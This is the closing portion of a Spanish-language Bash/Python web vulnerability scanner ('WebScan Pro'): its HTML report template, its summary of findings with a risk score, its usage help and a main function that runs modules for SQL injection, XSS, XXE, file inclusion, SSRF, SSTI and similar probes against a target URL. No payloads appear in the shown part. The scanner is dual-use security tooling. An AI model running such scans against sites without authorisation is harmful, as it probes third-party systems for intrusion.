      <button class="fbtn" onclick="filter('MEDIO',this)">&#x1F7E1; Medio ({medios})</button>
      <button class="fbtn" onclick="filter('BAJO',this)">&#x1F7E2; Bajo ({bajos})</button>
      <button class="fbtn" onclick="filter('INFO',this)">&#x1F535; Info ({infos})</button>
    </div>
    <div id="cards">{cards_html}</div>
  </section>

  <section id="tabla">
    <h2 class="sec-title">&#x1F4CB; Tabla Resumen</h2>
    <div class="tbl-wrap">
      <table>
        <thead><tr><th>#</th><th>Severidad</th><th>ID</th><th>Nombre</th><th>Categoria</th></tr></thead>
        <tbody>{table_rows}</tbody>
      </table>
    </div>
  </section>

  <section id="remediacion">
    <h2 class="sec-title">&#x1F6E0; Plan de Remediacion</h2>
    {rem_html}
  </section>

  <section id="checklist">
    <h2 class="sec-title">&#x2705; Checklist Post-Remediacion</h2>
    <ul class="checklist">{ck_html}</ul>
  </section>

</main>

<footer class="footer">
  <p>&#x1F510; WebScan Pro v2.0 &mdash; {scan_date} &mdash; CONFIDENCIAL</p>
  <p style="margin-top:4px">Analisis automatizado. Complementar con pentest manual.</p>
</footer>

<script>
document.querySelectorAll('.card-hdr').forEach(h=>{{
  if(h.style.cursor==='default') return;
  h.addEventListener('click',()=>{{
    const b=h.nextElementSibling;
    if(b) b.style.display=b.style.display==='block'?'none':'block';
  }});
}});
function filter(s,btn){{
  document.querySelectorAll('.fbtn').forEach(b=>b.classList.remove('on'));
  btn.classList.add('on');
  document.querySelectorAll('.card[data-sev]').forEach(c=>{{
    c.style.display=(s==='ALL'||c.dataset.sev===s)?'block':'none';
  }});
}}
document.querySelectorAll('.bar-fill').forEach(b=>{{
  const w=b.style.width; b.style.width='0';
  setTimeout(()=>{{b.style.width=w;}},300);
}});
const secs=document.querySelectorAll('section[id]');
window.addEventListener('scroll',()=>{{
  let cur='';
  secs.forEach(s=>{{if(window.scrollY>=s.offsetTop-90)cur=s.id;}});
  document.querySelectorAll('.nav a').forEach(a=>{{
    a.classList.toggle('active',a.getAttribute('href')==='#'+cur);
  }});
}});
</script>
</body>
</html>"""

    path = os.path.join(out_dir, "informe_completo.html")
    with open(path, "w", encoding="utf-8") as fout:
        fout.write(html)
    print(f"  [OK] Informe HTML       : {path}")
    return path

# ── Ejecutar los tres generadores ────────────────────────────────
make_executive_txt()
make_technical_txt()
make_html()
print(f"\n  Directorio de salida: {out_dir}")
PYEOF

  local exit_code=$?
  if [[ $exit_code -eq 0 ]]; then
    ok "Informes generados correctamente en:"
    ok "  ${WHITE}${OUTPUT_DIR}${NC}"
    echo ""
    echo -e "  ${DIM}  informe_ejecutivo.txt   — Resumen para direccion/management${NC}"
    echo -e "  ${DIM}  informe_tecnico_IT.txt  — Detalle tecnico para el equipo IT${NC}"
    echo -e "  ${DIM}  informe_completo.html   — Informe interactivo (abrir en navegador)${NC}"
  else
    err "Fallo al generar los informes (codigo: ${exit_code})"
    err "Comprueba que Python3 esta instalado: python3 --version"
  fi
}

# ════════════════════════════════════════════════════════════════════
# RESUMEN FINAL
# ════════════════════════════════════════════════════════════════════
show_summary() {
  echo ""
  echo -e "${CYAN}${BOLD}╔══════════════════════════════════════════════════╗"
  echo -e "║              RESUMEN DEL ESCANEO                ║"
  echo -e "╚══════════════════════════════════════════════════╝${NC}"
  echo ""
  echo -e "  ${WHITE}Objetivo:${NC}  $TARGET_URL"
  echo -e "  ${WHITE}Fecha:${NC}     $SCAN_DATE"
  echo ""
  echo -e "  ${WHITE}${BOLD}Vulnerabilidades encontradas:${NC}"
  echo -e "  ${RED}${BOLD}  ● CRÍTICO:  $CRITICOS${NC}"
  echo -e "  ${ORANGE}${BOLD}  ● ALTO:     $ALTOS${NC}"
  echo -e "  ${YELLOW}${BOLD}  ● MEDIO:    $MEDIOS${NC}"
  echo -e "  ${GREEN}${BOLD}  ● BAJO:     $BAJOS${NC}"
  echo -e "  ${BLUE}${BOLD}  ● INFO:     $INFOS${NC}"
  echo -e "  ${WHITE}  ─────────────────────"
  echo -e "  ${WHITE}${BOLD}  TOTAL:     $TOTAL_VULNS${NC}"
  echo ""

  local risk_score=$(( CRITICOS*10 + ALTOS*5 + MEDIOS*3 + BAJOS*1 ))
  local risk_level risk_color
  if [[ $risk_score -ge 20 ]]; then
    risk_level="CRÍTICO"; risk_color="$RED"
  elif [[ $risk_score -ge 10 ]]; then
    risk_level="ALTO"; risk_color="$ORANGE"
  elif [[ $risk_score -ge 5 ]]; then
    risk_level="MEDIO"; risk_color="$YELLOW"
  else
    risk_level="BAJO"; risk_color="$GREEN"
  fi

  echo -e "  ${WHITE}Nivel de riesgo global: ${risk_color}${BOLD}${risk_level} (Score: ${risk_score})${NC}"
  echo ""
  echo -e "  ${WHITE}Informes guardados en:${NC}"
  echo -e "  ${CYAN}  $OUTPUT_DIR${NC}"
  echo ""
  echo -e "${DIM}  Nota: Esta herramienta realiza pruebas pasivas y semi-activas."
  echo -e "  Para un pentest completo se recomienda análisis manual adicional.${NC}"
  echo ""
}

# ════════════════════════════════════════════════════════════════════
# MENÚ DE AYUDA
# ════════════════════════════════════════════════════════════════════
usage() {
  echo ""
  echo -e "  ${WHITE}${BOLD}Uso:${NC} $0 -u <URL> [opciones]"
  echo ""
  echo -e "  ${WHITE}Opciones:${NC}"
  echo -e "    ${CYAN}-u, --url${NC}       URL objetivo (obligatorio)"
  echo -e "    ${CYAN}-o, --output${NC}    Directorio de salida (default: ~/Desktop/WebScan_<timestamp>)"
  echo -e "    ${CYAN}-t, --timeout${NC}   Timeout en segundos (default: 12)"
  echo -e "    ${CYAN}--only <mod>${NC}    Ejecutar solo un módulo o varios separados por coma: headers|sqli|xss|xxe|lfi|rfi|path|ssrf|ssti|cms|files"
  echo -e "    ${CYAN}-h, --help${NC}      Mostrar esta ayuda"
  echo ""
  echo -e "  ${WHITE}Ejemplos:${NC}"
  echo -e "    $0 -u https://ejemplo.com"
  echo -e "    $0 -u https://ejemplo.com -o /tmp/scan_output"
  echo -e "    $0 -u https://ejemplo.com --only headers"
  echo -e "    $0 -u https://ejemplo.com --only headers,sqli,xss"
  echo -e "    $0 -u http://vulnerable-app.local -t 20"
  echo ""
}

# ════════════════════════════════════════════════════════════════════
# MAIN
# ════════════════════════════════════════════════════════════════════
main() {
  banner

  # Parsear argumentos
  local only_module=""
  while [[ $# -gt 0 ]]; do
    case "$1" in
      -u|--url)     TARGET_URL="$2";    shift 2 ;;
      -o|--output)  OUTPUT_DIR="$2";    shift 2 ;;
      -t|--timeout) TIMEOUT="$2";       shift 2 ;;
      --only)       only_module="$2";   shift 2 ;;
      -h|--help)    usage; exit 0 ;;
      *)            err "Opción desconocida: $1"; usage; exit 1 ;;
    esac
  done

  [[ -z "$OUTPUT_DIR" ]] && OUTPUT_DIR="${HOME}/Desktop/WebScan_${TIMESTAMP}"

  validate_target

  echo ""
  info "Iniciando escaneo..."
  info "Directorio de salida: ${WHITE}${OUTPUT_DIR}${NC}"
  echo ""

  # Ejecutar módulos. --only acepta un módulo o una lista separada por
  # comas (p.ej. --only headers,sqli,xss), ejecutados en el orden fijo
  # del escaneo completo, no en el orden en que se listaron.
  if [[ -z "$only_module" ]]; then
    scan_security_headers
    scan_sqli
    scan_xss
    scan_xxe
    scan_lfi
    scan_rfi
    scan_path_traversal
    scan_ssrf
    scan_ssti
    scan_cms
    scan_sensitive_files
    scan_fingerprint
  else
    IFS=',' read -ra requested_modules <<< "$only_module"
    local valid_modules=(headers sqli xss xxe lfi rfi path ssrf ssti cms files)
    local mod
    for mod in "${requested_modules[@]}"; do
      if [[ ! " ${valid_modules[*]} " =~ " ${mod} " ]]; then
        err "Módulo desconocido: $mod"; usage; exit 1
      fi
    done
    local requested_str=",${only_module},"
    [[ "$requested_str" == *",headers,"* ]] && scan_security_headers
    [[ "$requested_str" == *",sqli,"*    ]] && scan_sqli
    [[ "$requested_str" == *",xss,"*     ]] && scan_xss
    [[ "$requested_str" == *",xxe,"*     ]] && scan_xxe
    [[ "$requested_str" == *",lfi,"*     ]] && scan_lfi
    [[ "$requested_str" == *",rfi,"*     ]] && scan_rfi
    [[ "$requested_str" == *",path,"*    ]] && scan_path_traversal
    [[ "$requested_str" == *",ssrf,"*    ]] && scan_ssrf
    [[ "$requested_str" == *",ssti,"*    ]] && scan_ssti
    [[ "$requested_str" == *",cms,"*     ]] && scan_cms
    [[ "$requested_str" == *",files,"*   ]] && scan_sensitive_files
  fi

  generate_reports
  show_summary
}

main "$@"
